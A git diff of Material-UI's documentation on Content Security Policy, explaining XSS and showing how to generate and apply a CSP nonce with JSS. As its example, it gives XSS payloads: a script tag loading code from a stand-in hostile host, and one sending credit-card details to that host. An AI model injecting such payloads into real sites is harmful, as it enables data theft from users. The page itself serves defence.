@@ -1,25 +1,52 @@
-# Content Security Policy
+# Content Security Policy (CSP)
 
-Starting in JSS version 9.6.0, Material-UI supports Content Security Policy headers.
+Starting with JSS version 9.6.0, Material-UI supports Content Security Policy headers.
 
 ## What is CSP and why is it useful?
 
-Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://website.example` the CSP header `default-src: 'self';` will allow all assets that are located at `https://website.example/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input:
+Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://website.example` the CSP header `default-src: 'self';` will allow all assets that are located at `https://website.example/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
 
 ```
-<script src="https://hostile.example/bad.js"></script>
+<script>
+  sendCreditCardDetails('https://hostile.example');
+</script>
 ```
 
-Although, with a secure CSP header, the browser will not load this script.
+This vulnrivbility would allow the attacker to execute anything. Although, with a secure CSP header, the browser will not load this script.
 
 You can read more about CSP [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
 
 ## How does one implement CSP?
 
-In order to use CSP with Material-UI (and JSS), you need to set a `style-src` nonce in the meta tag like so:
+In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.
 
-```
-<meta property="csp-nonce" content="longAndRandomStringGeneratedByServerUponEachRequest">
+
+A CSP nonce is a Base 64 encoded string. You can generate one like this:
+
+```es6
+import uuidv4 from "uuid/v4";
+
+const nonce = new Buffer(uuidv4()).toString("base64");
 ```
 
-If you are new to CSP, this will probably not make much sense. [JSS has a great tutorial on how to achieve this.](https://github.com/cssinjs/jss/blob/master/docs/csp.md)
+It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
+
+```es6
+header('Content-Security-Policy').set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
+```
+
+Then you must pass this nonce to JSS so it can set it accordingly. The client side gets the nonce from a header.
+
+```jsx
+<meta property="csp-nonce" content={nonce} />
+```
+
+If you are using Server Side Rendering, you should additionally pass the nonce in the `<style>` tag on the server.
+
+```jsx
+<style 
+  id="jss-server-side"
+  nonce={nonce}
+  dangerouslySetInnerHTML={{ __html: pageContext.sheetsRegistry.toString() }} 
+/>
+```
